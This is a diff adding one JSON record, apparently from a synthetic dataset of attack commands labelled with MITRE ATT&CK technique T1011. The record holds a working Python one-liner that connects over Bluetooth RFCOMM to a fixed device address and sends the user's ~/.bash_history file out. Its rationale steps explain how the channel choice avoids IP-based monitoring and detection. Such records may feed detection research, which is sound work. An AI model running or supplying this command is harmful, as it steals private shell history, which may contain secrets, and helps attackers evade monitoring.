@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('00:1A:7D:DA:71:13', 27)); p=os.path.expanduser('~/.bash_history'); s.sendall(open(p,'rb').read()); s.close()\"",
+  "explanation": "Uses Bluetooth RFCOMM channel 27 to move shell history data outside the normal IP stack, consistent with T1011 exfiltration over other network mediums.",
+  "rationale_steps": [
+    "Choose Bluetooth (RFCOMM) to avoid IP-based monitoring.",
+    "Connect to an uncommon RFCOMM channel (27) to reduce detection.",
+    "Read and send ~/.bash_history over the RFCOMM socket.",
+    "Terminate connection cleanly to leave minimal indicators."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-dde69e91",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
